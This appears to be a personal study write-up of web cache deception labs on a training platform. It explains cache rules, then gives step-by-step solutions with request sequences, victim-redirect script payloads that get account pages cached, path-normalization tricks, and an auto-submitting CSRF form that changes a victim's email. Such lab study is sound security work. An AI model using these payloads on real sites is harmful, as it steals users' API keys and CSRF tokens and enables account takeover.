# Web Cache Deception
Web cache deception is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content. It's caused by discrepancies between how the cache server and origin server handle requests.

## Web caches
A web cache is a system that sits between the origin server and the user. When a client requests a static resource, the request is first directed to the cache. If the cache doesn't contain a copy of the resource (known as a cache miss), the request is forwarded to the origin server, which processes and responds to the request. The response is then sent to the cache before being sent to the user. The cache uses a preconfigured set of rules to determine whether to store the response.

When a request for the same static resource is made in the future, the cache serves the stored copy of the response directly to the user (known as a cache hit).

**Cache keys:** cache makes decision whether to store base on these aspects:
- URL path and query params
- Other elements such as headers and content type

**Cache rules:**
- Static file extension: match the extension of static files like `.css` or `.js`.
- Static directory: match all URL paths that start with a specific prefix like `/static` or `/assets`.
- File name: match specific file names to target files that are universally required for web operations and change rarely like `robots.txt` or `favicon.ico`.

### LAB: Exploiting path mapping for web cache deception
The API key is shown in the `/my-account`. Try adding a static extension and make another request to `/my-account/pucavv.js`.
Notice that the response contains the `X-Cache: miss` and `Cache-Control: max-age=30` headers. The `X-Cache: miss` header indicates that this response wasn't served from the cache. The `Cache-Control: max-age=30` header suggests that if the response has been cached, it should be stored for 30 seconds.
Resend the request to `/my-account/pucavv.js` and notice `X-Cache: hit`. This means `/my-account/pucavv.js` is cached and has a cache rule based on `.js`.
Use this script to make the victim visit his `/my-account` page and store it's content in the cache:

    <script>
        location = "https://0a78003f03a9e1c280f7096300340038.web-security-academy.net/my-account/pucavv.js"
    </script>

After the victim viewed the page, we visit the same URL to obtain his API key store in the cache.

### LAB: Exploiting path delimiters for web cache deception
Use the [delimiter_list.txt](./delimeter_list.txt) as a payload to find the discrepancy between the origin server and the cache by sending the `GET /my-account$$pucavv.js` to the Intruder and bruteforce for the response containing `/my-account` page.
Found that `/my-account;pucavv.js` returns the page's content. Use this script to make the victim vist his `/my-account` page and store it's content in the cache:

    <script>
        location = "https://0a2c00c404d1923583d714ab009f0099.web-security-academy.net/my-account;pucavv.js"
    </script>

After the victim viewed the page, we visit the same URL to obtain his API key store in the cache.

### LAB: Exploiting origin server normalization for web cache deception
Make a `GET /resources/..%2fmy-account` request and notice the `X-Cache: miss` header. Resend this request, now receive a `X-Cache: hit` header. This indicates that there is static directory cache rule and the server is normalizing the path to `/my-account`.
Use this script to make the victim vist his `/my-account` page and store it's content in the cache:

    <script>
        location = "https://0a5b00b803dbaa4d80c003b300fc0058.web-security-academy.net/resources/..%2fmy-account"
    </script>

> Note: When exploiting normalization by the cache server, encode all characters in the path traversal sequence. Using encoded characters helps avoid unexpected behavior when using delimiters, and there's no need to have an unencoded slash following the static directory prefix since the cache will handle the decoding. 

### LAB: Exploiting cache server normalization for web cache deception
Use the [delimiter_list.txt](./delimeter_list.txt) as a payload to find the discrepancy between the origin server and the cache by sending the `GET /my-account$$pucavv` to the Intruder and bruteforce for the response containing `/my-account` page.
Found that both `?` (`%3f`) and `#` (`%23`) are delimiters that return the page's content. Now make a request exploiting the normalization of the cache server and found that for `GET %2fmy-account%23%2f%2e%2e%2fresources HTTP/2` (`/my-account#/../resources`) the server respond with `X-Cache` header. This means:
- The cache server interprets it as `/resources`
- The origin server interprets it as `/my-account`

Use this script to make the victim visit his `/my-account` page and store it's content in the cache:

    <script>
        location = "https://0a5b00b803dbaa4d80c003b300fc0058.web-security-academy.net%2fmy-account%23%2f%2e%2e%2fresources"
    </script>

### LAB: Exploiting exact-match cache rules for web cache deception
First find the delimiter that cause the discrepancy just like the other labs which are `;` and `?`. 
Test the cache server and found out that it doesn't have static extension or static directory rule. Let's test for file name rule. Send this request:

    GET /robots.txt HTTP/2

Notice the `X-Cache` header, which indicates that the cache server has a file name rule.
Try path normalization by sending this request:

    GET /my-account;%2f%2e%2e%2frobots.txt HTTP/2 or
    GET /my-account?%2f%2e%2e%2frobots.txt HTTP/2 

Notice only the `;` delimiter cause the cache server to store the request. This means: 
- The cache server interprets it as `/robots.txt`
- The origin server interprets it as `/my-account`

Use this script to make the victim visit his `/my-account` page and store it's content in the cache:

    <script>
        location = "https://0a5b00b803dbaa4d80c003b300fc0058.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt"
    </script>

Now visit the same location and obtain the victim's CSRF token. Use that to construct this form which when delivered to the victim will cause the victim to change his email:

    <html>
        <body>
            <form action="https://0aea0036031f814680c57bc800a3009c.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="haha&#64;gmail&#46;com" />
            <input type="hidden" name="csrf" value="v5tv5ZzB8ipY1PY9hFeaEB5tHoq7zS9L" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
